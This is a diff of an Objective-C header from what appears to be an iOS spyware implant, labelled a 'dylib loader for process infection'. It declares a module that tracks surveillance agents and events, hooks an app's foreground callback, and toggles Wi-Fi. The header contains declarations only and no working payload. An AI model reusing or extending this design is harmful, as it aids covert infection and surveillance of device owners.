@@ -1,9 +1,9 @@
 /*
- * RCSIpony - dylib loader for process infection
+ * RCSiOS - dylib loader for process infection
  *  pon pon 
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 22/09/2009
+ * Created on 22/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -13,12 +13,9 @@
 #ifndef __RCSILoader_h__
 #define __RCSILoader_h__
 
+
 #import "RCSICommon.h"
 #import "RCSISharedMemory.h"
-
-
-extern RCSISharedMemory *mSharedMemoryCommand;
-extern RCSISharedMemory *mSharedMemoryLogging;
 
 static void TurnWifiOn(CFNotificationCenterRef center, 
                        void *observer,
@@ -31,28 +28,23 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                         const void *object,
                         CFDictionaryRef userInfo);
 
-
-@interface RCSILoader : NSObject
+@interface dylibModule : NSObject 
 {
-  BOOL mMainThreadRunning;
+  BOOL            mMainThreadRunning;
+  NSMutableArray  *mAgentsArray;
+  NSMutableArray  *mEventsArray;
+  NSString        *mDylibName;
+  id              mUIAppDelegate;
+  IMP             mApplicationWillEnterForeground;
+  time_t          mConfigId;
 }
 
-//
-// @author
-//  revenge
-// @abstract
-//  This function will communicatore within the core through shared memory
-//
-- (void)communicateWithCore;
+@property (readwrite, assign) NSMutableArray *mAgentsArray;
+@property (readwrite, assign) NSMutableArray *mEventsArray;
+@property (readwrite)         time_t         mConfigId;  
 
-//
-// @author
-//  revenge
-// @abstract
-//  This function will be responsible of communicating with our Core in order
-//  to read the passed configuration and start all the required external agents
-//
-- (void)startCoreCommunicator;
+- (void)dylibMainRunLoop;
+- (void)threadDylibMainRunLoop;
 
 @end
 
